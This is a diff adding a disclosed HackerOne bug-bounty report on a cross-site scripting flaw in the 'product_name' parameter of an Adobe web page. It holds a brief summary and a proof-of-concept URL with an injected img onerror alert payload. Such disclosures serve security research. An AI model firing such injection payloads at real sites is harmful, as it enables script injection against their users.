@@ -1,0 +1,14 @@
+ReportLink:https://hackerone.com/reports/50389
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/dsopas
+ReportedTo:Adobe(adobe)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:18.10.2016 20:37:15
+
+Summary:
+A cross-site scripting vulnerability exists in the "product_name" variable of this Adobe web application.  The XSS vector can be changed to work across browsers, and the following proof-of-concept works in Firefox.  
+
+Proof-of-concept:
+``http://www.adobe.com/cfusion/google/fonts/content.cfm?spider=google&code=/type/browser/pdfs/BLCQ/BellCentennialStd-NameNum.pdf&type=resource&product_name=%3C/a%3E%3Cimg%20src=x%20onerror=alert%28/dsopas/%29%3E%3C!--``
